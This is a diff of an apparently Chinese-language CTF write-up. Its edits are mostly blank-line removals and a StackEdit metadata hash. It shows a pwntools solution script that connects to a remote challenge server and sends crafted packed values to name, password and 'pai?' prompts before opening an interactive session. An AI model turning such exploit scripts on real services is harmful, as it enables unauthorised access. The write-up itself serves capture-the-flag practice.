@@ -91,7 +91,6 @@ v2=0
 
 p.recvuntil('name:\n')
 p.sendline(p64(buf))
-
 p.recvuntil('password:\n')
 p.sendline(p64(v2))
 ```
@@ -114,16 +113,12 @@ v4 和 pai 都进行了强制转换
 from pwn import *
 #p=process('./pwn1')
 p=remote('188.131.218.201',10001)
-
 buf=0x20
 v2=0
-
 p.recvuntil('name:\n')
 p.sendline(p64(buf))
-
 p.recvuntil('password:\n')
 p.sendline(p64(v2))
-
 p.recvuntil('pai?\n')
 p.sendline('1078530000')
 p.interactive()
@@ -311,6 +306,6 @@ int main(){
 }
 ```
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMjA3MTAzMzA5Nyw2OTc3OTExODgsLTM5Nz
+eyJoaXN0b3J5IjpbMTg2NDA2OTExMSw2OTc3OTExODgsLTM5Nz
 kyNzQxNF19
 -->
